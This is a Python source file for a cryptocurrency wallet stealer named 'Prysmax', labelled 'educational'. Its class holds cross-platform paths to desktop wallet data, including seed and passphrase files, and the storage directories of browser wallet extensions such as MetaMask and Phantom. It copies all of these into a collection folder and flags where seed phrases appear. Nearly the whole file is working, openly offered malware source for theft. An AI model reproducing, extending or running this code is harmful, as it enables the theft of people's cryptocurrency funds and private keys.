#!/usr/bin/env python3
"""
Prysmax Wallet Stealer Module
Educational content only

Enhanced wallet stealer with cross-platform support, better error handling,
and comprehensive cryptocurrency wallet detection.
"""

import os
import sys
import json
import shutil
import platform
import logging
import glob
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class WalletStealer:
    """
    Enhanced cryptocurrency wallet stealer with cross-platform support.
    Supports desktop wallets and browser extension wallets across multiple platforms.
    """
    
    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        self.platform = platform.system().lower()
        self.wallets = self._get_desktop_wallets()
        self.browser_wallets = self._get_browser_extension_wallets()
        
        logger.info(f"WalletStealer initialized for {self.platform} platform")
        
    def _get_desktop_wallets(self) -> Dict[str, Dict[str, Any]]:
        """Get desktop wallet paths based on operating system"""
        if self.platform == "windows":
            return {
                "Exodus": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Exodus"),
                    "files": ["exodus.wallet", "seed.seco", "info.seco", "passphrase.json"],
                    "type": "desktop",
                    "description": "Exodus Desktop Wallet"
                },
                "Atomic": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\atomic"),
                    "files": ["Local Storage", "IndexedDB", "logs"],
                    "type": "desktop", 
                    "description": "Atomic Wallet"
                },
                "Electrum": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Electrum\\wallets"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Electrum Bitcoin Wallet"
                },
                "Ethereum": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Ethereum\\keystore"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Ethereum Keystore"
                },
                "Bitcoin": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Bitcoin"),
                    "files": ["wallet.dat", "bitcoin.conf", "wallets"],
                    "type": "desktop",
                    "description": "Bitcoin Core"
                },
                "Litecoin": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Litecoin"),
                    "files": ["wallet.dat", "litecoin.conf"],
                    "type": "desktop",
                    "description": "Litecoin Core"
                },
                "Dash": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\DashCore"),
                    "files": ["wallet.dat", "dash.conf"],
                    "type": "desktop",
                    "description": "Dash Core"
                },
                "Zcash": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Zcash"),
                    "files": ["wallet.dat"],
                    "type": "desktop",
                    "description": "Zcash"
                },
                "Bytecoin": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\bytecoin"),
                    "files": ["*.wallet"],
                    "type": "desktop",
                    "description": "Bytecoin Wallet"
                },
                "Jaxx": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\com.liberty.jaxx\\IndexedDB"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Jaxx Liberty"
                },
                "Coinomi": {
                    "path": os.path.expanduser("~\\AppData\\Local\\Coinomi\\Coinomi\\wallets"),
                    "files": ["*.wallet"],
                    "type": "desktop",
                    "description": "Coinomi Wallet"
                },
                "Guarda": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Guarda"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Guarda Wallet"
                },
                "Daedalus": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Daedalus"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Daedalus Cardano Wallet"
                },
                "Yoroi": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Yoroi"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Yoroi Cardano Wallet"
                }
            }
        elif self.platform == "darwin":  # macOS
            return {
                "Exodus": {
                    "path": os.path.expanduser("~/Library/Application Support/Exodus"),
                    "files": ["exodus.wallet", "seed.seco", "info.seco"],
                    "type": "desktop",
                    "description": "Exodus Desktop Wallet"
                },
                "Atomic": {
                    "path": os.path.expanduser("~/Library/Application Support/atomic"),
                    "files": ["Local Storage", "IndexedDB"],
                    "type": "desktop",
                    "description": "Atomic Wallet"
                },
                "Electrum": {
                    "path": os.path.expanduser("~/.electrum/wallets"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Electrum Bitcoin Wallet"
                },
                "Bitcoin": {
                    "path": os.path.expanduser("~/Library/Application Support/Bitcoin"),
                    "files": ["wallet.dat", "bitcoin.conf"],
                    "type": "desktop",
                    "description": "Bitcoin Core"
                },
                "Litecoin": {
                    "path": os.path.expanduser("~/Library/Application Support/Litecoin"),
                    "files": ["wallet.dat", "litecoin.conf"],
                    "type": "desktop",
                    "description": "Litecoin Core"
                },
                "Ethereum": {
                    "path": os.path.expanduser("~/Library/Ethereum/keystore"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Ethereum Keystore"
                },
                "Daedalus": {
                    "path": os.path.expanduser("~/Library/Application Support/Daedalus"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Daedalus Cardano Wallet"
                }
            }
        else:  # Linux
            return {
                "Exodus": {
                    "path": os.path.expanduser("~/.config/Exodus"),
                    "files": ["exodus.wallet", "seed.seco", "info.seco"],
                    "type": "desktop",
                    "description": "Exodus Desktop Wallet"
                },
                "Atomic": {
                    "path": os.path.expanduser("~/.config/atomic"),
                    "files": ["Local Storage", "IndexedDB"],
                    "type": "desktop",
                    "description": "Atomic Wallet"
                },
                "Electrum": {
                    "path": os.path.expanduser("~/.electrum/wallets"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Electrum Bitcoin Wallet"
                },
                "Bitcoin": {
                    "path": os.path.expanduser("~/.bitcoin"),
                    "files": ["wallet.dat", "bitcoin.conf"],
                    "type": "desktop",
                    "description": "Bitcoin Core"
                },
                "Litecoin": {
                    "path": os.path.expanduser("~/.litecoin"),
                    "files": ["wallet.dat", "litecoin.conf"],
                    "type": "desktop",
                    "description": "Litecoin Core"
                },
                "Ethereum": {
                    "path": os.path.expanduser("~/.ethereum/keystore"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Ethereum Keystore"
                },
                "Monero": {
                    "path": os.path.expanduser("~/.bitmonero"),
                    "files": ["*"],
                    "type": "desktop",
                    "description": "Monero Wallet"
                }
            }
    
    def _get_browser_extension_wallets(self) -> Dict[str, Dict[str, str]]:
        """Get browser extension wallet paths based on operating system"""
        if self.platform == "windows":
            return {
                "MetaMask": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "brave": "~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "firefox": "~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\storage\\default\\moz-extension+++*",
                    "description": "MetaMask Ethereum Wallet"
                },
                "Phantom": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
                    "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
                    "brave": "~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
                    "description": "Phantom Solana Wallet"
                },
                "Binance": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
                    "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
                    "description": "Binance Chain Wallet"
                },
                "Coinbase": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
                    "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
                    "description": "Coinbase Wallet"
                },
                "TronLink": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
                    "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
                    "description": "TronLink Tron Wallet"
                },
                "Ronin": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
                    "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
                    "description": "Ronin Wallet (Axie Infinity)"
                },
                "Trust": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
                    "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
                    "description": "Trust Wallet"
                },
                "Solflare": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic",
                    "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic",
                    "description": "Solflare Solana Wallet"
                },
                "Slope": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo",
                    "description": "Slope Solana Wallet"
                },
                "MathWallet": {
                    "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
                    "description": "MathWallet Multi-chain"
                }
            }
        elif self.platform == "darwin":  # macOS
            return {
                "MetaMask": {
                    "chrome": "~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "edge": "~/Library/Application Support/Microsoft Edge/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "brave": "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "description": "MetaMask Ethereum Wallet"
                },
                "Phantom": {
                    "chrome": "~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa",
                    "edge": "~/Library/Application Support/Microsoft Edge/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa",
                    "description": "Phantom Solana Wallet"
                },
                "Coinbase": {
                    "chrome": "~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad",
                    "description": "Coinbase Wallet"
                }
            }
        else:  # Linux
            return {
                "MetaMask": {
                    "chrome": "~/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "chromium": "~/.config/chromium/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "brave": "~/.config/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "description": "MetaMask Ethereum Wallet"
                },
                "Phantom": {
                    "chrome": "~/.config/google-chrome/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa",
                    "chromium": "~/.config/chromium/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa",
                    "description": "Phantom Solana Wallet"
                }
            }
    
    def steal(self) -> bool:
        """
        Main wallet stealing function with enhanced error handling
        
        Returns:
            bool: True if any wallets were found and extracted
        """
        success = False
        try:
            wallet_dir = os.path.join(self.output_dir, "Wallets")
            os.makedirs(wallet_dir, exist_ok=True)
            
            logger.info(f"Starting wallet extraction to {wallet_dir}")
            
            # Steal desktop wallets
            if self._steal_desktop_wallets(wallet_dir):
                success = True
                
            # Steal browser extension wallets  
            if self._steal_browser_wallets(wallet_dir):
                success = True
            
            # Generate wallet analysis report
            self._generate_wallet_report(wallet_dir)
            
        except Exception as e:
            logger.error(f"General wallet stealer error: {e}")
            
        return success
    
    def _steal_desktop_wallets(self, output_dir: str) -> bool:
        """
        Steal desktop wallet applications with enhanced detection
        
        Args:
            output_dir: Output directory for wallet data
            
        Returns:
            bool: True if any desktop wallets were found
        """
        desktop_dir = os.path.join(output_dir, "Desktop_Wallets")
        os.makedirs(desktop_dir, exist_ok=True)
        
        success = False
        
        for wallet_name, wallet_info in self.wallets.items():
            try:
                wallet_path = wallet_info["path"]
                if os.path.exists(wallet_path):
                    wallet_output = os.path.join(desktop_dir, wallet_name)
                    os.makedirs(wallet_output, exist_ok=True)
                    
                    if self._copy_wallet_files(wallet_path, wallet_output, wallet_info["files"]):
                        success = True
                        logger.info(f"Successfully extracted {wallet_name} wallet")
                        
                        # Create wallet metadata
                        self._create_wallet_metadata(wallet_output, wallet_name, wallet_info, wallet_path)
                else:
                    logger.debug(f"{wallet_name} wallet not found at {wallet_path}")
                    
            except Exception as e:
                logger.error(f"Error stealing {wallet_name}: {e}")
        
        return success
    
    def _steal_browser_wallets(self, output_dir: str) -> bool:
        """
        Steal browser extension wallets with enhanced detection
        
        Args:
            output_dir: Output directory for wallet data
            
        Returns:
            bool: True if any browser wallets were found
        """
        browser_dir = os.path.join(output_dir, "Browser_Extensions")
        os.makedirs(browser_dir, exist_ok=True)
        
        success = False
        
        for wallet_name, browsers in self.browser_wallets.items():
            try:
                wallet_output = os.path.join(browser_dir, wallet_name)
                wallet_found = False
                
                for browser, path in browsers.items():
                    if browser == "description":
                        continue
                        
                    expanded_path = os.path.expanduser(path)
                    
                    if "*" in expanded_path:
                        # Handle wildcard paths (Firefox profiles)
                        if self._copy_wildcard_paths(expanded_path, wallet_output, browser):
                            wallet_found = True
                    else:
                        if os.path.exists(expanded_path):
                            if not wallet_found:
                                os.makedirs(wallet_output, exist_ok=True)
                            browser_output = os.path.join(wallet_output, browser)
                            if self._copy_directory(expanded_path, browser_output):
                                wallet_found = True
                                logger.debug(f"Extracted {wallet_name} from {browser}")
                
                if wallet_found:
                    success = True
                    logger.info(f"Successfully extracted {wallet_name} browser extension")
                    
                    # Create extension metadata
                    self._create_extension_metadata(wallet_output, wallet_name, browsers)
                            
            except Exception as e:
                logger.error(f"Error stealing {wallet_name} extension: {e}")
        
        return success
    
    
    def _copy_wallet_files(self, source_path: str, dest_path: str, files: List[str]) -> bool:
        """
        Copy specific wallet files with enhanced error handling
        
        Args:
            source_path: Source directory path
            dest_path: Destination directory path  
            files: List of files/patterns to copy
            
        Returns:
            bool: True if any files were copied successfully
        """
        success = False
        
        try:
            for file_pattern in files:
                if file_pattern == "*":
                    # Copy entire directory
                    if self._copy_directory(source_path, dest_path):
                        success = True
                elif "*" in file_pattern:
                    # Handle wildcard patterns
                    pattern_path = os.path.join(source_path, file_pattern)
                    matching_files = glob.glob(pattern_path)
                    
                    for file_path in matching_files:
                        if os.path.exists(file_path):
                            dest_file = os.path.join(dest_path, os.path.basename(file_path))
                            if os.path.isfile(file_path):
                                shutil.copy2(file_path, dest_file)
                                success = True
                            elif os.path.isdir(file_path):
                                if self._copy_directory(file_path, dest_file):
                                    success = True
                else:
                    # Copy specific files
                    file_path = os.path.join(source_path, file_pattern)
                    if os.path.exists(file_path):
                        if os.path.isfile(file_path):
                            shutil.copy2(file_path, dest_path)
                            success = True
                        else:
                            dest_file_path = os.path.join(dest_path, file_pattern)
                            if self._copy_directory(file_path, dest_file_path):
                                success = True
                                
        except Exception as e:
            logger.error(f"Error copying wallet files: {e}")
            
        return success
    
    def _copy_directory(self, source: str, destination: str) -> bool:
        """
        Copy directory recursively with enhanced error handling
        
        Args:
            source: Source directory path
            destination: Destination directory path
            
        Returns:
            bool: True if directory was copied successfully
        """
        try:
            if os.path.exists(source):
                shutil.copytree(source, destination, dirs_exist_ok=True)
                logger.debug(f"Copied directory {source} to {destination}")
                return True
        except Exception as e:
            logger.error(f"Error copying directory {source}: {e}")
            
        return False
    
    def _copy_wildcard_paths(self, pattern_path: str, dest_path: str, browser_name: str) -> bool:
        """
        Handle wildcard paths for Firefox profiles with enhanced detection
        
        Args:
            pattern_path: Path pattern with wildcards
            dest_path: Destination directory
            browser_name: Name of the browser
            
        Returns:
            bool: True if any matching paths were found and copied
        """
        success = False
        
        try:
            # Get all matching paths
            matching_paths = glob.glob(pattern_path)
            
            for path in matching_paths:
                if os.path.exists(path):
                    # Create unique destination for each match
                    path_hash = str(hash(path))[-8:]
                    dest = os.path.join(dest_path, f"{browser_name}_{path_hash}")
                    
                    if self._copy_directory(path, dest):
                        success = True
                        logger.debug(f"Copied wildcard path {path} to {dest}")
                    
        except Exception as e:
            logger.error(f"Error with wildcard path {pattern_path}: {e}")
            
        return success
    
    def _create_wallet_metadata(self, output_dir: str, wallet_name: str, wallet_info: Dict, wallet_path: str) -> None:
        """
        Create metadata file for extracted wallet
        
        Args:
            output_dir: Output directory for the wallet
            wallet_name: Name of the wallet
            wallet_info: Wallet configuration information
            wallet_path: Original wallet path
        """
        try:
            metadata = {
                "wallet_name": wallet_name,
                "wallet_type": wallet_info.get("type", "unknown"),
                "description": wallet_info.get("description", ""),
                "original_path": wallet_path,
                "extraction_date": datetime.now().isoformat(),
                "platform": self.platform,
                "files_extracted": [],
                "total_size": 0
            }
            
            # Scan extracted files
            for root, dirs, files in os.walk(output_dir):
                for file in files:
                    if file == "wallet_metadata.json":
                        continue
                    file_path = os.path.join(root, file)
                    rel_path = os.path.relpath(file_path, output_dir)
                    file_size = os.path.getsize(file_path)
                    
                    metadata["files_extracted"].append({
                        "filename": file,
                        "relative_path": rel_path,
                        "size": file_size
                    })
                    metadata["total_size"] += file_size
            
            # Save metadata
            metadata_path = os.path.join(output_dir, "wallet_metadata.json")
            with open(metadata_path, "w", encoding='utf-8') as f:
                json.dump(metadata, f, indent=2, ensure_ascii=False)
                
        except Exception as e:
            logger.error(f"Error creating wallet metadata: {e}")
    
    def _create_extension_metadata(self, output_dir: str, wallet_name: str, browsers: Dict) -> None:
        """
        Create metadata file for extracted browser extension wallet
        
        Args:
            output_dir: Output directory for the extension
            wallet_name: Name of the wallet extension
            browsers: Browser configuration information
        """
        try:
            metadata = {
                "extension_name": wallet_name,
                "description": browsers.get("description", ""),
                "extraction_date": datetime.now().isoformat(),
                "platform": self.platform,
                "browsers_found": [],
                "total_size": 0
            }
            
            # Scan extracted browser data
            if os.path.exists(output_dir):
                for item in os.listdir(output_dir):
                    item_path = os.path.join(output_dir, item)
                    if os.path.isdir(item_path) and item != "wallet_metadata.json":
                        browser_size = self._get_directory_size(item_path)
                        metadata["browsers_found"].append({
                            "browser": item,
                            "size": browser_size
                        })
                        metadata["total_size"] += browser_size
            
            # Save metadata
            metadata_path = os.path.join(output_dir, "extension_metadata.json")
            with open(metadata_path, "w", encoding='utf-8') as f:
                json.dump(metadata, f, indent=2, ensure_ascii=False)
                
        except Exception as e:
            logger.error(f"Error creating extension metadata: {e}")
    
    def _generate_wallet_report(self, wallet_dir: str) -> None:
        """
        Generate comprehensive wallet analysis report
        
        Args:
            wallet_dir: Wallet output directory
        """
        try:
            report = {
                "extraction_date": datetime.now().isoformat(),
                "platform": self.platform,
                "wallets_scanned": {
                    "desktop": list(self.wallets.keys()),
                    "browser_extensions": list(self.browser_wallets.keys())
                },
                "wallets_found": {
                    "desktop": [],
                    "browser_extensions": []
                },
                "statistics": {
                    "total_wallets_found": 0,
                    "total_files_extracted": 0,
                    "total_size_bytes": 0,
                    "desktop_wallets_count": 0,
                    "browser_extensions_count": 0
                }
            }
            
            # Scan desktop wallets
            desktop_dir = os.path.join(wallet_dir, "Desktop_Wallets")
            if os.path.exists(desktop_dir):
                for wallet_name in os.listdir(desktop_dir):
                    wallet_path = os.path.join(desktop_dir, wallet_name)
                    if os.path.isdir(wallet_path):
                        wallet_size = self._get_directory_size(wallet_path)
                        file_count = self._count_files_in_directory(wallet_path)
                        
                        report["wallets_found"]["desktop"].append({
                            "name": wallet_name,
                            "size": wallet_size,
                            "file_count": file_count
                        })
                        
                        report["statistics"]["total_size_bytes"] += wallet_size
                        report["statistics"]["total_files_extracted"] += file_count
                        report["statistics"]["desktop_wallets_count"] += 1
            
            # Scan browser extensions
            browser_dir = os.path.join(wallet_dir, "Browser_Extensions")
            if os.path.exists(browser_dir):
                for extension_name in os.listdir(browser_dir):
                    extension_path = os.path.join(browser_dir, extension_name)
                    if os.path.isdir(extension_path):
                        extension_size = self._get_directory_size(extension_path)
                        file_count = self._count_files_in_directory(extension_path)
                        
                        browsers_found = []
                        for item in os.listdir(extension_path):
                            item_path = os.path.join(extension_path, item)
                            if os.path.isdir(item_path) and not item.endswith('.json'):
                                browsers_found.append(item)
                        
                        report["wallets_found"]["browser_extensions"].append({
                            "name": extension_name,
                            "browsers": browsers_found,
                            "size": extension_size,
                            "file_count": file_count
                        })
                        
                        report["statistics"]["total_size_bytes"] += extension_size
                        report["statistics"]["total_files_extracted"] += file_count
                        report["statistics"]["browser_extensions_count"] += 1
            
            # Calculate totals
            report["statistics"]["total_wallets_found"] = (
                report["statistics"]["desktop_wallets_count"] + 
                report["statistics"]["browser_extensions_count"]
            )
            
            # Save report
            report_path = os.path.join(wallet_dir, "wallet_extraction_report.json")
            with open(report_path, "w", encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            
            logger.info(
                f"Generated wallet report: {report['statistics']['total_wallets_found']} wallets, "
                f"{report['statistics']['total_files_extracted']} files, "
                f"{report['statistics']['total_size_bytes']} bytes"
            )
            
        except Exception as e:
            logger.error(f"Error generating wallet report: {e}")
    
    def _get_directory_size(self, path: str) -> int:
        """
        Get directory size in bytes with error handling
        
        Args:
            path: Directory path
            
        Returns:
            int: Size in bytes
        """
        total_size = 0
        try:
            for dirpath, dirnames, filenames in os.walk(path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    if os.path.exists(file_path):
                        total_size += os.path.getsize(file_path)
        except Exception as e:
            logger.error(f"Error calculating directory size for {path}: {e}")
            
        return total_size
    
    def _count_files_in_directory(self, path: str) -> int:
        """
        Count files in directory recursively
        
        Args:
            path: Directory path
            
        Returns:
            int: Number of files
        """
        file_count = 0
        try:
            for root, dirs, files in os.walk(path):
                file_count += len(files)
        except Exception as e:
            logger.error(f"Error counting files in {path}: {e}")
            
        return file_count
    
    def get_wallet_info(self) -> Dict[str, Any]:
        """
        Get information about available wallets on the system
        
        Returns:
            Dict with wallet information
        """
        try:
            info = {
                "platform": self.platform,
                "scan_date": datetime.now().isoformat(),
                "desktop_wallets": [],
                "browser_extensions": [],
                "summary": {
                    "desktop_found": 0,
                    "extensions_found": 0,
                    "total_found": 0
                }
            }
            
            # Check desktop wallets
            for wallet_name, wallet_info in self.wallets.items():
                wallet_path = wallet_info["path"]
                exists = os.path.exists(wallet_path)
                
                wallet_data = {
                    "name": wallet_name,
                    "path": wallet_path,
                    "exists": exists,
                    "description": wallet_info.get("description", ""),
                    "type": wallet_info.get("type", "unknown")
                }
                
                if exists:
                    wallet_data["size"] = self._get_directory_size(wallet_path)
                    info["summary"]["desktop_found"] += 1
                
                info["desktop_wallets"].append(wallet_data)
            
            # Check browser extensions
            for wallet_name, browsers in self.browser_wallets.items():
                extension_data = {
                    "name": wallet_name,
                    "description": browsers.get("description", ""),
                    "browsers": []
                }
                
                extension_found = False
                for browser, path in browsers.items():
                    if browser == "description":
                        continue
                        
                    expanded_path = os.path.expanduser(path)
                    exists = os.path.exists(expanded_path) if "*" not in expanded_path else bool(glob.glob(expanded_path))
                    
                    extension_data["browsers"].append({
                        "browser": browser,
                        "path": expanded_path,
                        "exists": exists
                    })
                    
                    if exists:
                        extension_found = True
                
                if extension_found:
                    info["summary"]["extensions_found"] += 1
                
                info["browser_extensions"].append(extension_data)
            
            # Calculate totals
            info["summary"]["total_found"] = (
                info["summary"]["desktop_found"] + 
                info["summary"]["extensions_found"]
            )
            
            return info
            
        except Exception as e:
            logger.error(f"Error getting wallet info: {e}")
            return {"total_found": 0, "error": str(e)}


# Enhanced wallet stealer with additional cryptocurrency support
class AdvancedWalletStealer(WalletStealer):
    """
    Advanced wallet stealer with support for additional cryptocurrencies and features
    """
    
    def __init__(self, output_dir: str):
        super().__init__(output_dir)
        self._add_additional_wallets()
    
    def _add_additional_wallets(self) -> None:
        """Add support for additional cryptocurrency wallets"""
        additional_wallets = {
            "Wasabi": {
                "path": os.path.expanduser("~/.walletwasabi/client/Wallets") if self.platform != "windows" 
                       else os.path.expanduser("~\\AppData\\Roaming\\WalletWasabi\\Client\\Wallets"),
                "files": ["*.json"],
                "type": "desktop",
                "description": "Wasabi Bitcoin Privacy Wallet"
            },
            "Sparrow": {
                "path": os.path.expanduser("~/.sparrow/wallets") if self.platform != "windows"
                       else os.path.expanduser("~\\AppData\\Roaming\\Sparrow\\wallets"),
                "files": ["*"],
                "type": "desktop", 
                "description": "Sparrow Bitcoin Wallet"
            }
        }
        
        self.wallets.update(additional_wallets)
        logger.info(f"Added {len(additional_wallets)} additional wallet types")
    
    def analyze_wallet_security(self, wallet_dir: str) -> Dict[str, Any]:
        """
        Analyze extracted wallets for security information
        
        Args:
            wallet_dir: Directory containing extracted wallets
            
        Returns:
            Dict with security analysis
        """
        try:
            analysis = {
                "analysis_date": datetime.now().isoformat(),
                "wallets_analyzed": [],
                "security_findings": {
                    "encrypted_wallets": 0,
                    "unencrypted_wallets": 0,
                    "seed_phrases_found": 0,
                    "private_keys_found": 0
                }
            }
            
            # Analyze desktop wallets
            desktop_dir = os.path.join(wallet_dir, "Desktop_Wallets")
            if os.path.exists(desktop_dir):
                for wallet_name in os.listdir(desktop_dir):
                    wallet_path = os.path.join(desktop_dir, wallet_name)
                    if os.path.isdir(wallet_path):
                        wallet_analysis = self._analyze_individual_wallet(wallet_path, wallet_name)
                        analysis["wallets_analyzed"].append(wallet_analysis)
                        
                        # Update security findings
                        if wallet_analysis.get("encrypted", False):
                            analysis["security_findings"]["encrypted_wallets"] += 1
                        else:
                            analysis["security_findings"]["unencrypted_wallets"] += 1
                        
                        if wallet_analysis.get("seed_phrase_found", False):
                            analysis["security_findings"]["seed_phrases_found"] += 1
                        
                        if wallet_analysis.get("private_keys_found", 0) > 0:
                            analysis["security_findings"]["private_keys_found"] += wallet_analysis["private_keys_found"]
            
            # Save analysis report
            analysis_path = os.path.join(wallet_dir, "security_analysis.json")
            with open(analysis_path, "w", encoding='utf-8') as f:
                json.dump(analysis, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Completed security analysis of {len(analysis['wallets_analyzed'])} wallets")
            return analysis
            
        except Exception as e:
            logger.error(f"Error analyzing wallet security: {e}")
            return {"error": str(e)}
    
    def _analyze_individual_wallet(self, wallet_path: str, wallet_name: str) -> Dict[str, Any]:
        """Analyze individual wallet for security characteristics"""
        analysis = {
            "wallet_name": wallet_name,
            "encrypted": False,
            "seed_phrase_found": False,
            "private_keys_found": 0,
            "wallet_files": [],
            "suspicious_files": []
        }
        
        try:
            # Scan wallet files
            for root, dirs, files in os.walk(wallet_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    file_info = {
                        "filename": file,
                        "size": os.path.getsize(file_path),
                        "encrypted": False
                    }
                    
                    # Check for encryption indicators
                    if file.lower().endswith(('.dat', '.wallet', '.json')):
                        if self._check_file_encryption(file_path):
                            file_info["encrypted"] = True
                            analysis["encrypted"] = True
                    
                    # Check for seed phrases or private keys
                    if file.lower() in ['seed.seco', 'passphrase.json', 'mnemonic.txt']:
                        analysis["seed_phrase_found"] = True
                        analysis["suspicious_files"].append(file)
                    
                    analysis["wallet_files"].append(file_info)
            
        except Exception as e:
            analysis["error"] = str(e)
        
        return analysis
    
    def _check_file_encryption(self, file_path: str) -> bool:
        """Check if a file appears to be encrypted"""
        try:
            with open(file_path, 'rb') as f:
                # Read first 512 bytes
                header = f.read(512)
                
                # Simple heuristics for encrypted data
                # Encrypted files typically have high entropy
                if len(set(header)) > 200:  # High byte diversity
                    return True
                
                # Check for common encryption signatures
                encryption_signatures = [
                    b'Salted__',  # OpenSSL encrypted
                    b'\x00\x00\x00\x00\x00\x00\x00\x00',  # Bitcoin Core encrypted
                ]
                
                for sig in encryption_signatures:
                    if sig in header:
                        return True
                        
        except Exception:
            pass
            
        return False

